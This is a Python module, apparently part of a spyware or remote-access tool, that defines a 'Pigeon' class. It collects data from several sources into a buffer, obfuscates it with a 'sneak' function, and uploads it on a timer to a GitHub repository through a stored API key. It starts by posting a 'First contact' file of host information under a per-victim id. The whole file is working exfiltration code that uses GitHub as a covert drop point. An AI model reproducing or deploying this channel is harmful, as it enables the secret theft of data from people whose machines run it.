from config import PARAM, METHODS, RUNNING
from github import Github, Repository
from key import GIT_API_KEY
from threading import Lock
from time import sleep, strftime


class Pigeon:
    __buffer: dict[str, str] = {}
    __bufferLock: Lock = Lock()
    __interval: int = 300
    __repo: Repository.Repository 
    __uid: str = ""

    @staticmethod
    def pushToBuffer(src: str, con: str) -> None:
        while True:
            if Pigeon.__bufferLock.acquire(blocking=False):
                if Pigeon.__buffer.get(src) == None:
                    Pigeon.__buffer[src] = con
                else:
                    Pigeon.__buffer[src] += con
                break
        Pigeon.__bufferLock.release()

    @staticmethod
    def startService() -> None:
        while RUNNING.is_set():
            sleep(Pigeon.__interval)
            Pigeon.__deliverContents()

    @staticmethod
    def stopService() -> None:
        RUNNING.clear()

    @staticmethod
    def initComs(uid: str, info: str) -> None:
        Pigeon.__interval = int(PARAM["interval"]) if PARAM.get("interval") != None else 300
        Pigeon.__repo = Github(GIT_API_KEY).get_repo(PARAM["repo"])
        info = METHODS["sneak"](info)
        Pigeon.__uid = uid
        _, _ = Pigeon.__repo.create_file(
            "{}/00_info".format(uid), "First contact", info
        )

    @staticmethod
    def __deliverContents() -> None:
        while True:
            if Pigeon.__bufferLock.acquire(blocking=False):
                info = METHODS["sneak"](str(Pigeon.__buffer))
                message: str = strftime("%Y-%m-%d %H:%M")
                _, _ = Pigeon.__repo.create_file(
                    "{}/{}".format(Pigeon.__uid, message),
                    "Update from {}".format(message),
                    info,
                )
                Pigeon.__buffer = {}
                Pigeon.__bufferLock.release()
                break
